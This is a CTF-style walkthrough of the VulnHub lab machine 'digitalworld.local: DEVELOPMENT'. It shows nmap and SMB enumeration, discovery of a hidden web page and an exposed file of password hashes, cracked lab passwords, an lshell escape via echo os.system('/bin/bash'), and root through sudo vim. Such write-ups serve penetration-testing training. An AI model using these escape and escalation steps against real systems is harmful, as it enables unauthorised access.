# VulnHub > digitalworld.local: DEVELOPMENT

**About Release**

* Name: digitalworld.local: DEVELOPMENT
* Date release: 28 Dec 2018
* Author: Donavan
* Series: digitalworld.local

**Download**

* devt-improved.7z (Size: 2.7 GB)
* Download: https://mega.nz/#!lt9FzKZR!H792Il9g2o7qkwxN009WYHwM34f0iPMCHLM-y0YI1b8
* Download (Mirror): https://download.vulnhub.com/digitalworld/devt-improved.7z
* Download (Torrent): https://download.vulnhub.com/digitalworld/devt-improved.7z.torrent ([Magnet](magnet:?xt=urn:btih:251D38505A0810F43A88C846FA6656E0F0144FFF&dn=devt-improved.7z&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

**Description**

This machine reminds us of a DEVELOPMENT environment: misconfigurations rule the roost. This is designed for OSCP practice, and the original version of the machine was used for a CTF. It is now revived, and made slightly more nefarious than the original.

If you MUST have hints for this machine (even though they will probably not help you very much until you root the box!): Development is (#1): different from production, (#2): a mess of code, (#3): under construction.

Note: Some users report the box may seem to be "unstable" with aggressive scanning. The homepage gives a clue why.

Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.

# Services Enumeration

Nmap reveals several open ports:

~~~
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  2048 79:07:2b:2c:2c:4e:14:0a:e7:b3:63:46:c6:b3:ad:16 (RSA)
113/tcp  open  ident?
|_auth-owners: oident
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_auth-owners: root
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
|_auth-owners: root
8080/tcp open  http-proxy  IIS 6.0
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sun, 01 Nov 2020 07:52:42 GMT
|     Server: IIS 6.0
|     Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT
|     ETag: "230-57de32091ad69"
|     Accept-Ranges: bytes
|     Content-Length: 560
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <html>
|     <head><title>DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!</title>
|     </head>
|     <body>
|     <p>Welcome to the Development Page.</p>
|     <br/>
|     <p>There are many projects in this box. View some of these projects at html_pages.</p>
|     <br/>
|     <p>WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.</p>
|     <br/>
|     <br/>
|     <br/>
|     <hr>
|     <i>Powered by IIS 6.0</i>
|     </body>
|     <!-- Searching for development secret page... where could it be? -->
|     <!-- Patrick, Head of Development-->
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 01 Nov 2020 07:52:42 GMT
|     Server: IIS 6.0
|     Allow: GET,POST,OPTIONS,HEAD
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Sun, 01 Nov 2020 07:52:42 GMT
|     Server: IIS 6.0
|     Content-Length: 293
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>IIS 6.0 Server at 172.16.222.170 Port 8080</address>
|_    </body></html>
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: IIS 6.0
|_http-title: DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!

Host script results:
|_nbstat: NetBIOS name: DEVELOPMENT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: development
|   NetBIOS computer name: DEVELOPMENT\x00
|   Domain name: \x00
|   FQDN: development
|_  System time: 2020-11-01T07:54:13+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-01T07:54:13
|_  start_date: N/A
~~~

# Samba (port 445)

There is a network share (`access`) but we can't connect without password:

~~~
kali@kali:~$ smbclient -L //172.16.222.170
Enter WORKGROUP\kali's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	access          Disk      
	IPC$            IPC       IPC Service (development server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
kali@kali:~$ smbclient //172.16.222.170/access
Enter WORKGROUP\kali's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
~~~

# Web (port 8080)

## `/htmlpages`

A web service is running on port 8080. The main page tells us that the `/html_pages` page is listing projects. There is also a comment that tells us about a development secret page.

~~~
kali@kali:/data/digitalworld-local-development$ curl -s http://172.16.222.170:8080/
<html>
<head><title>DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!</title>
</head>
<body>
<p>Welcome to the Development Page.</p>
<br/>
<p>There are many projects in this box. View some of these projects at html_pages.</p>
<br/>
<p>WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.</p>
<br/>
<br/>
<br/>
<hr>
<i>Powered by IIS 6.0</i>
</body>

<!-- Searching for development secret page... where could it be? -->

<!-- Patrick, Head of Development-->

</html>
~~~

Let's check:

~~~
kali@kali:~$ curl -s http://172.16.222.170:8080/html_pages
-rw-r--r-- 1 www-data www-data      285 Sep 26 17:46 about.html
-rw-r--r-- 1 www-data www-data     1049 Sep 26 17:51 config.html
-rw-r--r-- 1 www-data www-data      199 Jul 23 15:37 default.html
-rw-r--r-- 1 www-data www-data     1086 Sep 28 09:22 development.html
-rw-r--r-- 1 www-data www-data      446 Jun 14 01:37 downloads.html
-rw-r--r-- 1 www-data www-data      285 Sep 26 17:53 error.html
-rw-r--r-- 1 www-data www-data        0 Sep 28 09:23 html_pages
-rw-r--r-- 1 www-data www-data      751 Sep 28 09:22 index.html
-rw-r--r-- 1 www-data www-data      202 Sep 26 17:57 login.html
-rw-r--r-- 1 www-data www-data      682 Jul 23 15:36 register.html
-rw-r--r-- 1 www-data www-data       74 Jul 23 16:29 tryharder.html
-rw-r--r-- 1 www-data www-data      186 Sep 26 17:58 uploads.html
~~~

## `/development.html`

One of these html pages (`development.html`) is interesting because it reveals the name of the secret page (`developmentsecretpage`):

~~~
kali@kali:~$ curl -s http://172.16.222.170:8080/development.html
<html>
<head><title>Security by Obscurity: The Path to DEVELOPMENTSECRETPAGE.</title>
</head>
<body>
<p>Security by obscurity is one of the worst ways one can defend from a cyberattack. This assumes that the adversary is not smart enough to be able to detect weak points in a corporate network.</p>
<p>An example of security by obscurity is in the local of webpages. For instance, IT administrators like to insert backdoors into applications for remote management, sometimes without the project teams knowing.</p>
<p>Once I worked on an implementation whereby the developer added a backdoor which was aptly named "hackersecretpage". It was hilarious because it contained a link to a file upload function, where the hacker installed a VNC viewer to perform remote desktop management!</p>
<p>A pity Patrick claims to be a security advocate, but isn't one. Hence, I shall secretly write in pages to guide hackers to make Patrick learn his lesson the hard way.</p>
</body>

<hr>
<i>Powered by IIS 6.0.</i>

</html>

<!-- You tried harder! Visit ./developmentsecretpage. -->
~~~

## `/developmentsecretpage/`

Let's check what this secret page tells us:

~~~
kali@kali:~$ curl -s http://172.16.222.170:8080/developmentsecretpage/
<html>
<head>
<title>Welcome to Good Tech</title>
</head>
<body>

<p>
Welcome to the Development Secret Page. 
</p>

<p>
Please drop by <a href="./patrick.php">Patrick's</a> PHP page to get to know our Development Head better. But beware, this site is still under construction; please bear with us!
</p>


This is the property of Good Tech. All rights reserved.
</body>
</html>
~~~

## logout / login

Let's follow the link to `/developmentsecretpage/patrick.php`. There is a link to logout (`/developmentsecretpage/patrick.php?logout=1`):

~~~
kali@kali:~$ curl -s http://172.16.222.170:8080/developmentsecretpage/patrick.php
<html>
<head>
<title>Page title</title>
</head>
<body>
<p> Welcome to my profile page! I am Patrick, the Head of Development in Good Tech. </p>

<p> I have previously worked in enterprise technologies. I joined Good Tech two years ago as the then-Manager of Development. I lead two teams: one that does enterprise architecture and an in-house development team.
</p>

<p> As long as you're willing to <b>try harder</b>, there will always be a future for the young aspiring developer or solution architect! Please visit our <a href="./sitemap.php">sitemap</a> to find out more about our department.</p>

<p> Regards <br/>
Patrick<br/>
Head, Development Network</p>

<p>
<a href="/developmentsecretpage/patrick.php?logout=1">Click here to log out.</a>
</p>

This is the property of Good Tech. All rights reserved.
</body>
</html>
~~~

It leads to a login page:

~~~
kali@kali:~$ curl -s http://172.16.222.170:8080/developmentsecretpage/sitemap.php?logout=1
<html>
<head>
<title>A Map of the Development Network -- the Brains of Good Tech</title>
</head>
<body><!--  This is the login form  -->
<form method="post" action="/developmentsecretpage/sitemap.php">
Username: <input type="text" name="slogin_POST_username" value=""><br>
Password: <input type="password" name="slogin_POST_password"><br>
<input type="submit" name="slogin_POST_send" value="Enter">
</form>
This is the property of Good Tech. All rights reserved.
</body>
</html>
~~~

Providing the form with a login and password discloses the following error message:

~~~
Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 335

Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 336
~~~

## `slogin_lib.inc.php`

Searching for "slogin_lib.inc.php" on the Internet leads to https://www.exploit-db.com/exploits/7444. After unsuccessfully trying to exploit the Remote File Inclusion (RFI), I eventually found the `slog_users.txt` file:

~~~
kali@kali:/data/digitalworld-local-development/files$ curl -s http://172.16.222.170:8080/developmentsecretpage/slog_users.txt
admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
intern, 4a8a2b374f463b7aedbb44a066363b81
patrick, 87e6d56ce79af90dbe07d387d3d0579e
qiu, ee64497098d0926d198f54f6d5431f98
~~~

Using various password hashes databases on the Internet, we get most of the passwords:

username | password
---|---
admin | not found
intern | 12345678900987654321
patrick | P@ssw0rd25
qiu | qiu

# SSH as intern

## home

Connect as "intern" using SSH worked, but we are left with a limited shell:

~~~
$ ssh intern@172.16.222.170 
Congratulations! You tried harder!
Welcome to Development!
Type '?' or 'help' to get the list of allowed commands
intern:~$ ll
total 12
drwxrwxrwx 9 intern intern 4096 Jul 16  2018 access
-rw-r--r-- 1 intern intern   46 Dec 26  2018 local.txt
-rw-r--r-- 1 intern intern  299 Dec 26  2018 work.txt
intern:~$ cat local.txt
*** unknown syntax: cat
intern:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
~~~

## Break the lshell

Evade the limited shell (lshell) using the following command:

~~~
intern:~$ echo os.system('/bin/bash')
~~~

# Lateral move (intern -> patrick)

Now, we can move laterally to patrick using the password found previously:

~~~
intern@development:~/access$ su patrick
Password: P@ssw0rd25
patrick@development:/home/intern/access$ id
uid=1001(patrick) gid=1005(patrick) groups=1005(patrick),108(lxd)
patrick@development:/home/intern/access$ sudo -l
Matching Defaults entries for patrick on development:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User patrick may run the following commands on development:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /bin/nano
~~~

# Privilege escalation and root flag

## Privesc

Patrick can run `vim` as `root` without password. As `vim` allows to execute commands, we can have a root shell. Let's start `vim` (`sudo vim`) and type `:!/bin/bash` to spawn a root shell:

## Root flag

And now, let's get the root flag:

~~~
root@development:/root# cat proof.txt 
Congratulations on rooting DEVELOPMENT! :)
~~~
